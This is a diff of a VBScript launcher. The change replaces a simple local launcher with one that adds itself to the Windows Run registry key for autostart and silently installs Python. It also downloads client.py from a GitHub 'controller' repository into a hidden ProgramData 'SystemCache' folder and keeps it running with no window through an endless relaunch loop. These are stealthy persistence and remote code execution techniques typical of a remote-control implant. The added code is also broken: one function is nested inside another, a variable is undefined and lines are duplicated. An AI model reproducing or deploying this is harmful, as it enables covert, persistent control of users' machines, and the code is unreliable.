@@ -6,178 +6,167 @@
 ' ============================================================================
 
 Option Explicit
-
-' Configuration
-Const SCRIPT_PATH = "C:\Users\Brylle\controller\client.py"
-Const PROCESS_NAME = "python.exe"
-Const WINDOW_TITLE = "client.py"
-
-' ============================================================================
-' MAIN EXECUTION
-' ============================================================================
-
-Sub Main()
-    On Error Resume Next
-    
-    Dim objShell, objWMIService, colProcesses
-    Dim strComputer, strQuery, processCount
-    Dim objFSO, boolFileExists
-    
-    Set objShell = CreateObject("WScript.Shell")
-    Set objFSO = CreateObject("Scripting.FileSystemObject")
-    
-    ' Check if Python script exists
-    boolFileExists = objFSO.FileExists(SCRIPT_PATH)
-    If Not boolFileExists Then
-        LogError "Client.py script not found at: " & SCRIPT_PATH
-        Exit Sub
+Dim sh, fso
+Set sh = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+Const EXPECTED_MD5 = "407195e0c539416350f23a6ca36baa80"
+Dim scriptDir: scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
+Dim safeDir: safeDir = sh.ExpandEnvironmentStrings("%ProgramData%") & "\SystemCache"
+If Not fso.FolderExists(safeDir) Then
+  fso.CreateFolder(safeDir)
+  On Error Resume Next
+  fso.GetFolder(safeDir).Attributes = fso.GetFolder(safeDir).Attributes Or 2
+  On Error GoTo 0
+End If
+Dim logDir: logDir = sh.ExpandEnvironmentStrings("%TEMP%") & "\ClientLauncher"
+If Not fso.FolderExists(logDir) Then fso.CreateFolder(logDir)
+Dim logPath: logPath = logDir & "\launcher.log"
+Sub EnsureAutorun()
+  On Error Resume Next
+  Dim runKey, cmd
+  runKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ClientLauncher"
+  cmd = "wscript.exe """ & WScript.ScriptFullName & """"
+  sh.RegWrite runKey, cmd, "REG_SZ"
+End Sub
+EnsureAutorun
+Sub Log(s)
+  On Error Resume Next
+  Dim lf: Set lf = fso.OpenTextFile(logPath, 8, True)
+  lf.WriteLine Now & " " & s
+  lf.Close
+End Sub
+Function ExecOut(cmd)
+  Dim p: Set p = sh.Exec(cmd)
+  Dim o: o = ""
+  Do While Not p.StdOut.AtEndOfStream
+    o = o & p.StdOut.ReadLine() & vbCrLf
+  Loop
+  ExecOut = o
+End Function
+Function FileMD5(path)
+  On Error Resume Next
+  Dim out: out = ExecOut("cmd /c certutil -hashfile """ & path & """ MD5")
+  Dim lines: lines = Split(out, vbCrLf)
+  Dim i, h: h = ""
+  For i = 0 To UBound(lines)
+    If Len(lines(i)) >= 32 And InStr(lines(i), " ") = 0 Then
+      h = Trim(lines(i))
+      Exit For
     End If
-    
-    ' Check for existing instances using more reliable method
-    If IsClientRunning() Then
-        LogInfo "Client.py is already running. Exiting."
-        Exit Sub
-    End If
-    
-    ' Launch client.py silently using improved method
-    LaunchClientSilently objShell
-    
-    ' Verify launch success with longer wait
-    WScript.Sleep 3000 ' Wait 3 seconds
-    If IsClientRunning() Then
-        LogInfo "Client.py launched successfully"
+  Next
+  FileMD5 = LCase(h)
+End Function
+Function DownloadToFile(url, path)
+  On Error Resume Next
+  Dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP")
+  xhr.Open "GET", url, False
+  xhr.Send
+  If xhr.Status = 200 Then
+    Dim stm: Set stm = CreateObject("ADODB.Stream")
+    stm.Type = 1
+    stm.Open
+    stm.Write xhr.responseBody
+    stm.SaveToFile path, 2
+    stm.Close
+    DownloadToFile = True
+  Else
+    DownloadToFile = False
+  End If
+End Function
+Function PythonAvailable()
+Function IsOnline()
+  On Error Resume Next
+  Dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP")
+  xhr.Open "GET", "http://www.msftconnecttest.com/connecttest.txt", False
+  xhr.Send
+  If xhr.Status = 200 Then IsOnline = True : Exit Function
+  Set xhr = CreateObject("MSXML2.XMLHTTP")
+  xhr.Open "GET", "https://www.google.com/generate_204", False
+  xhr.Send
+  If xhr.Status = 204 Or xhr.Status = 200 Then
+    IsOnline = True
+  Else
+    IsOnline = False
+  End If
+End Function
+  On Error Resume Next
+  Dim out: out = ExecOut("cmd /c py -3 -V")
+  If InStr(out, "Python 3") > 0 Then PythonAvailable = True : Exit Function
+  out = ExecOut("cmd /c python.exe -V")
+  If InStr(out, "Python 3") > 0 Then PythonAvailable = True Else PythonAvailable = False
+End Function
+Sub EnsurePython()
+  If PythonAvailable() Then Exit Sub
+  If PythonAvailable() Then Exit Sub
+  If Not IsOnline() Then
+    Log "Offline detected; deferring Python install"
+    Exit Sub
+  End If
+  Dim url, installer
+  If InStr(arch, "64") > 0 Then
+    url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe"
+  Else
+    url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8.exe"
+    url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8.exe"
+  End If
+  installer = logDir & "\python312.exe"
+  If Not DownloadToFile(url, installer) Then Log "Python download failed: " & url : Exit Sub
+  Dim cmd: cmd = """" & installer & """ /quiet PrependPath=1 Include_test=0"
+  sh.Run cmd, 0, True
+  If Not PythonAvailable() Then Log "Python install failed"
+End Sub
+Function FindClientPy()
+  Dim p1: p1 = scriptDir & "\client.py"
+  If fso.FileExists(p1) Then FindClientPy = p1 : Exit Function
+  Dim p2: p2 = safeDir & "\client.py"
+  If fso.FileExists(p2) Then FindClientPy = p2 : Exit Function
+  Dim url: url = "https://raw.githubusercontent.com/Bryllebanquil/controller/main/client.py"
+  If Not IsOnline() Then
+    Log "Offline detected; deferring client.py download"
+    FindClientPy = ""
+    Exit Function
+  End If
+  If DownloadToFile(url, p2) Then
+    Dim md5: md5 = FileMD5(p2)
+    If md5 = EXPECTED_MD5 Then
+      FindClientPy = p2
+      Exit Function
     Else
-        LogError "Failed to launch client.py"
+      On Error Resume Next
+      fso.DeleteFile p2, True
+      On Error GoTo 0
+      Log "MD5 mismatch: " & md5
     End If
-    
-End Sub
-
-' ============================================================================
-' PROCESS MANAGEMENT FUNCTIONS
-' ============================================================================
-
-Function IsClientRunning()
-    On Error Resume Next
-    
-    Dim objWMIService, colProcesses, objProcess
-    Dim strComputer, strQuery, processCount
-    
-    strComputer = "."
-    processCount = 0
-    
-    ' Use WMI to find Python processes with client.py in command line
-    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
-    strQuery = "SELECT * FROM Win32_Process WHERE Name = 'python.exe' AND CommandLine LIKE '%client.py%'"
-    
-    Set colProcesses = objWMIService.ExecQuery(strQuery)
-    processCount = colProcesses.Count
-    
-    ' Also check for processes running from our specific path
-    If processCount = 0 Then
-        strQuery = "SELECT * FROM Win32_Process WHERE CommandLine LIKE '%" & Replace(SCRIPT_PATH, "\", "\\\\") & "%'"
-        Set colProcesses = objWMIService.ExecQuery(strQuery)
-        processCount = colProcesses.Count
-    End If
-    
-    IsClientRunning = (processCount > 0)
-    
-    On Error GoTo 0
+  Else
+    Log "client.py download failed"
+  End If
+  FindClientPy = ""
 End Function
-
-Sub LaunchClientSilently(objShell)
-    On Error Resume Next
-    
-    Dim strCommand, strWorkingDirectory
-    
-    ' Build the command with full path and proper escaping
-    strCommand = "cmd.exe /c ""cd /d """ & Left(SCRIPT_PATH, InStrRev(SCRIPT_PATH, "\")) & """ && python.exe """ & SCRIPT_PATH & """"""
-    strWorkingDirectory = Left(SCRIPT_PATH, InStrRev(SCRIPT_PATH, "\"))
-    
-    LogInfo "Launch command: " & strCommand
-    LogInfo "Working directory: " & strWorkingDirectory
-    
-    ' Use Run method with hidden window
-    objShell.Run strCommand, 0, False
-    
-    On Error GoTo 0
-End Sub
-
-' ============================================================================
-' LOGGING FUNCTIONS
-' ============================================================================
-
-Sub LogInfo(message)
-    On Error Resume Next
-    
-    Dim objFSO, objLogFile, strLogPath, strTimestamp
-    
-    strLogPath = GetLogFilePath()
-    strTimestamp = GetTimestamp()
-    
-    Set objFSO = CreateObject("Scripting.FileSystemObject")
-    Set objLogFile = objFSO.OpenTextFile(strLogPath, 8, True) ' 8 = ForAppending
-    
-    objLogFile.WriteLine strTimestamp & " [INFO] " & message
-    objLogFile.Close
-    
-    On Error GoTo 0
-End Sub
-
-Sub LogError(message)
-    On Error Resume Next
-    
-    Dim objFSO, objLogFile, strLogPath, strTimestamp
-    
-    strLogPath = GetLogFilePath()
-    strTimestamp = GetTimestamp()
-    
-    Set objFSO = CreateObject("Scripting.FileSystemObject")
-    Set objLogFile = objFSO.OpenTextFile(strLogPath, 8, True) ' 8 = ForAppending
-    
-    objLogFile.WriteLine strTimestamp & " [ERROR] " & message
-    objLogFile.Close
-    
-    On Error GoTo 0
-End Sub
-
-Function GetLogFilePath()
-    On Error Resume Next
-    
-    Dim objShell, strLogDir, strLogFile
-    
-    Set objShell = CreateObject("WScript.Shell")
-    strLogDir = objShell.ExpandEnvironmentStrings("%TEMP%") & "\ClientLauncher"
-    
-    ' Create log directory if it doesn't exist
-    Dim objFSO
-    Set objFSO = CreateObject("Scripting.FileSystemObject")
-    If Not objFSO.FolderExists(strLogDir) Then
-        objFSO.CreateFolder(strLogDir)
-    End If
-    
-    GetLogFilePath = strLogDir & "\launcher.log"
-    
-    On Error GoTo 0
+Function IsRunning()
+  On Error Resume Next
+  Dim svc: Set svc = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
+  Dim q: q = "SELECT * FROM Win32_Process WHERE CommandLine LIKE '%client.py%'"
+  Dim col: Set col = svc.ExecQuery(q)
+  IsRunning = (col.Count > 0)
 End Function
-
-Function GetTimestamp()
-    On Error Resume Next
-    
-    Dim dtNow
-    dtNow = Now()
-    
-    GetTimestamp = Year(dtNow) & "-" & _
-                   Right("0" & Month(dtNow), 2) & "-" & _
-                   Right("0" & Day(dtNow), 2) & " " & _
-                   Right("0" & Hour(dtNow), 2) & ":" & _
-                   Right("0" & Minute(dtNow), 2) & ":" & _
-                   Right("0" & Second(dtNow), 2)
-    
-    On Error GoTo 0
-End Function
-
-' ============================================================================
-' EXECUTE MAIN
-' ============================================================================
-
-Main()
+Sub LaunchClient(scriptPath)
+  Dim wd: wd = fso.GetParentFolderName(scriptPath)
+  Dim cmd
+  If PythonAvailable() Then
+    cmd = "cmd /c cd /d """ & wd & """ && py -3 """ & scriptPath & """"
+  Else
+    cmd = "cmd /c cd /d """ & wd & """ && python.exe """ & scriptPath & """"
+  End If
+  sh.Run cmd, 0, False
+End Sub
+Sub Main()
+  EnsurePython()
+  Dim cp: cp = FindClientPy()
+  If cp = "" Then Log "client.py unavailable" : Exit Sub
+  If Not IsRunning() Then LaunchClient cp : WScript.Sleep 3000
+  Do
+    If Not IsRunning() Then LaunchClient cp
+    WScript.Sleep 10000
+  Loop
+End Sub
+Main
